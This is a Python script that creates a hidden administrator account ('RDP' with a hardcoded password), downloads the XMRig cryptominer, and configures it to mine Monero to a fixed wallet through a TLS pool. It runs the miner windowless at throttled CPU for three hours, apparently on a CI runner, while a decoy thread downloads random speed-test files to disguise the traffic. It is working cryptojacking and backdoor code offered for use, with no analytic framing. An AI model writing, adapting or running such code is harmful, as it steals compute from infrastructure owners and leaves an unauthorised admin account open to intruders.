import os
import subprocess
import tempfile
import time
import random
import threading
import urllib.request
import zipfile
import json
import sys

# ==================== Configuration ====================
WALLET = "49UWTwnrxNXi8eMTCqdC5U3eiMHrPZkvvbsYN3WEde4o9RYebixumBCCy5oCdoSKkS2U6t9gXJFzJNkxXC7tJ1Uq4uky5BP"
POOL = "pool.hashvault.pro:443"
FINGERPRINT = "420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14"
CPU_HINT = 10                     # 10% CPU usage
RUNTIME_MINUTES = 180             # 3 hours

# ==================== Helper Functions ====================
def create_user():
    """Create a local user 'RDP' (as in your workflow)."""
    try:
        import subprocess
        subprocess.run(
            ['net', 'user', 'RDP', 'Runner-12345', '/add'],
            check=True, capture_output=True
        )
        subprocess.run(['net', 'localgroup', 'Administrators', 'RDP', '/add'], check=True)
        print("[+] User 'RDP' created.")
    except subprocess.CalledProcessError as e:
        print(f"[!] User creation failed: {e.stderr.decode()}")
        # Continue anyway; user may already exist

def download_xmrig():
    """Download and extract XMRig, return path to executable."""
    miner_url = "https://github.com/xmrig/xmrig/releases/download/v6.21.2/xmrig-6.21.2-msvc-win64.zip"
    zip_path = os.path.join(tempfile.gettempdir(), 'xmrig.zip')
    extract_dir = os.path.join(tempfile.gettempdir(), 'xmrig')
    urllib.request.urlretrieve(miner_url, zip_path)
    with zipfile.ZipFile(zip_path, 'r') as z:
        z.extractall(extract_dir)
    exe_path = None
    for root, dirs, files in os.walk(extract_dir):
        if 'xmrig.exe' in files:
            exe_path = os.path.join(root, 'xmrig.exe')
            break
    if not exe_path:
        raise Exception("xmrig.exe not found")
    return exe_path

def create_config(exe_path):
    """Create config.json in the same folder as the miner."""
    config = {
        "autosave": True,
        "cpu": {"enabled": True, "max-threads-hint": CPU_HINT},
        "opencl": False,
        "cuda": False,
        "pools": [{
            "algo": "rx/0",
            "url": POOL,
            "user": WALLET,
            "pass": "x",
            "tls": True,
            "tls-fingerprint": FINGERPRINT
        }],
        "donate": {"level": 1}
    }
    config_path = os.path.join(os.path.dirname(exe_path), 'config.json')
    with open(config_path, 'w') as f:
        json.dump(config, f, indent=4)
    print(f"[+] Config created at {config_path}")
    return config_path

def random_downloader(stop_event):
    """Background thread that downloads random files while the miner runs."""
    base_url = "https://speedtest.tele2.net/"
    while not stop_event.is_set():
        size = random.randint(10, 100)
        url = f"{base_url}{size}MB.zip"
        temp_file = os.path.join(tempfile.gettempdir(), f"rand_{size}.zip")
        try:
            print(f"[Downloader] Downloading {size} MB from {url}")
            urllib.request.urlretrieve(url, temp_file)
            os.remove(temp_file)
            print(f"[Downloader] Done, removed.")
        except Exception as e:
            print(f"[Downloader] Error: {e}")
        sleep_time = random.randint(30, 90)
        # Check stop event while sleeping
        for _ in range(sleep_time):
            if stop_event.is_set():
                break
            time.sleep(1)

def main():
    create_user()
    exe_path = download_xmrig()
    config_path = create_config(exe_path)

    # Start miner
    working_dir = os.path.dirname(exe_path)
    log_file = os.path.join(tempfile.gettempdir(), 'xmrig.log')
    with open(log_file, 'w') as f:
        pass  # truncate log
    miner_proc = subprocess.Popen(
        [exe_path, '--config=config.json'],
        cwd=working_dir,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1,
        creationflags=subprocess.CREATE_NO_WINDOW
    )
    print(f"[+] Miner started (PID {miner_proc.pid})")

    # Start random downloader thread
    stop_event = threading.Event()
    download_thread = threading.Thread(target=random_downloader, args=(stop_event,), daemon=True)
    download_thread.start()

    # Monitor for 3 hours
    start_time = time.time()
    end_time = start_time + RUNTIME_MINUTES * 60
    last_tail = 0
    try:
        while time.time() < end_time:
            # Check if miner died
            if miner_proc.poll() is not None:
                print("[!] Miner died unexpectedly.")
                break
            # Read any new lines from miner log
            with open(log_file, 'r') as f:
                f.seek(last_tail)
                new_lines = f.readlines()
                if new_lines:
                    print("".join(new_lines).strip())
                last_tail = f.tell()
            # Wait a minute
            time.sleep(60)
    except KeyboardInterrupt:
        print("[*] Interrupted by user.")
    finally:
        # Cleanup
        print("[*] Stopping miner and downloader...")
        miner_proc.terminate()
        miner_proc.wait(timeout=10)
        stop_event.set()
        download_thread.join(timeout=10)
        print("[+] Cleanup done.")

if __name__ == "__main__":
    main()
